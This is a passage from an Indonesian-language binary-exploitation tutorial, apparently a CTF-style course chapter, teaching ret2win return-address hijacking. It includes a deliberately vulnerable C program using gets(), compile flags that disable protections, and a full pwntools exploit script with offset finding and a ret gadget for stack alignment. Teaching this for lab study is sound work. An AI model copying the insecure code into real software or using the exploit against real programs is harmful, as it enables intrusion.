---
title: 'Chapter 3: Return Address Overwrite (Ret2Win)'
description: 'Teknik mengubah alur program dengan RIP hijacking'
prev:
    text: 'Chapter 2: Buffer Overflow'
    link: './Chapter2-Buffer_Overflow.md'
next:
    text: 'Chapter 4: Shellcode Injection'
    link: './Chapter4-Shellcode.md'
---

# Chapter 3: Return Address Overwrite (Ret2Win)

::: tip 🚀 Level Up!
Setelah bisa mengubah variabel, kita naik level ke mengubah **Alur Program** (Control Flow). Teknik ini dikenal sebagai **Ret2Win**.
:::

## 🧑‍💻 Konsep RIP Hijacking

Setiap kali fungsi dipanggil, komputer menyimpan **Return Address** (alamat untuk pulang) di Stack. Alamat ini memberi tahu CPU:

> _"Setelah fungsi ini selesai, lanjut eksekusi kode di baris X."_

::: info 🎯 Target
**Menimpa Return Address** tersebut dengan alamat fungsi lain yang kita inginkan (misal `fungsi_menang()` atau `system()`).
:::

### Stack Layout saat Function Call:

```
┌────────────────────┐  ← Higher Address
│   Previous RBP     │  ← Base Pointer (frame)
├────────────────────┤
│  🎯 Return Address  │  ← TARGET! (RIP hijack point)
├────────────────────┤
│   Local Variables  │
│   ┌───────────────┐ │
│   │ buffer[64]   │ │  ← Overflow starts here
│   └───────────────┘ │
└────────────────────┘  ← Lower Address
```

## 🔧 Tools: Pwndbg Cyclic

::: warning ⚡ Efficiency Tip
Daripada menghitung manual, kita menggunakan pola **Cyclic** untuk mencari offset secara instan.
:::

### Step by Step:

1. **Generate pola:**

    ```bash
    cyclic 100
    # Output: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam...
    ```

2. **Jalankan program sampai crash:**

    ```bash
    gdb ./vulnerable
    (gdb) run
    # Input: paste cyclic pattern
    ```

3. **Cek offset:**
    ```bash
    (gdb) cyclic -l <alamat_crash>
    # Output: 72  (offset to return address)
    ```

### Contoh dalam Pwndbg:

```bash
────────────────────[ REGISTERS ]────────────────────
RAX  0x0
RBX  0x0
RCX  0x7ffff7b042c0
RDX  0x0
RDI  0x7ffff7dd18a0
RSI  0x7fffffffdea1
R8   0x0
R9   0x7ffff7fe2180
R10  0x0
R11  0x206
R12  0x401060
R13  0x0
R14  0x0
R15  0x0
RBP  0x6161616c6161616b (← 'kaaalaaa')
RSP  0x7fffffffde28
RIP  0x6161616d6161616c (← 'laaamaa' = CRASH POINT!)

────────────────────[ DISASM ]────────────────────
Invalid address 0x6161616d6161616c  ← Program crashed!

pwndbg> cyclic -l laaamaa
Finding cyclic pattern of 8 bytes: b'laaamaa\x00' (hex: 0x6161616d6161616c)
Found at offset 72  ← BINGO!
```

## ⚠️ Masalah: The MOVAPS Curse

::: danger 💥 Common Issue
Pada arsitektur 64-bit (terutama Ubuntu versi baru), memanggil fungsi `system()` seringkali menyebabkan **crash** (Segmentation Fault) meskipun alamatnya benar.
:::

### 🔍 Penyebab:

- **Stack tidak sejajar** (unaligned)
- Instruksi `movaps` membutuhkan alamat Stack kelipatan **16-byte**
- Function calls di x64 harus maintain stack alignment

### ⚙️ Solusi (ROP Gadget):

Tambahkan instruksi `ret` kosong sebelum melompat ke fungsi target.

```bash
# Cari gadget 'ret' kosong
ROPgadget --binary ./program --only "ret"
# Atau dengan pwntools:
# rop = ROP('./program')
# ret_gadget = rop.find_gadget(['ret'])[0]
```

## 🧩 Struktur Payload

```python
from pwn import *

# Setup
binary = './vulnerable'
elf = ELF(binary)
rop = ROP(elf)

# Find addresses
win_func = elf.symbols['win']     # Address fungsi menang
ret_gadget = rop.find_gadget(['ret'])[0]  # Stack alignment

# Build payload
offset = 72  # From cyclic
payload = b"A" * offset
payload += p64(ret_gadget)        # Fix stack alignment
payload += p64(win_func)          # Jump to win function

print(f"Payload length: {len(payload)}")
print(f"Win function at: {hex(win_func)}")
```

## 🧪 Hands-on Example

### Vulnerable Code:

```c
// ret2win.c
#include <stdio.h>
#include <string.h>

void win() {
    printf("🎉 CONGRATULATIONS! You've hijacked the return address!\n");
    system("/bin/cat flag.txt");  // Print flag
}

void vulnerable() {
    char buffer[64];
    printf("Enter your input: ");
    gets(buffer);  // Vulnerability!
    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable();
    printf("Program finished normally.\n");
    return 0;
}
```

### Compile:

```bash
gcc -g -fno-stack-protector -no-pie ret2win.c -o ret2win
echo "PWN{ret2win_mastered}" > flag.txt
```

### Exploit Script:

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './ret2win'
context.binary = binary
elf = ELF(binary)

# Find offset
def find_offset():
    io = process(binary)
    pattern = cyclic(100)
    io.sendline(pattern)
    io.wait()
    core = io.corefile
    offset = cyclic_find(core.rip)
    log.info(f"Offset found: {offset}")
    return offset

# Exploit
def exploit():
    offset = 72  # Or use find_offset()
    win_addr = elf.symbols['win']

    # Handle stack alignment if needed
    rop = ROP(elf)
    ret_gadget = rop.find_gadget(['ret'])[0]

    payload = flat({
        offset: [
            ret_gadget,  # Stack alignment
            win_addr     # Jump to win()
        ]
    })

    log.info(f"Sending payload of length {len(payload)}")
    log.info(f"Win function at: {hex(win_addr)}")

    io = process(binary)
    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    exploit()
```

## 🎯 Checkpoint

::: details ✅ Apa yang sudah dipelajari?

- [x] Konsep Return Address dan RIP hijacking
- [x] Menggunakan Pwndbg Cyclic untuk finding offset
- [x] Memahami MOVAPS curse dan stack alignment
- [x] Menggunakan ROP gadgets untuk fix alignment
- [x] Struktur payload untuk Ret2Win attack
- [x] Debugging techniques dengan GDB/Pwndbg
      :::

---

::: tip 📚 Final Boss Incoming
Sekarang kita sudah menguasai **control flow hijacking**! Selanjutnya adalah teknik tertinggi: **Shellcode Injection** – membawa kode kita sendiri!

👉 [Lanjut ke Chapter 4: Shellcode Injection](./Chapter4-Shellcode.md)
:::
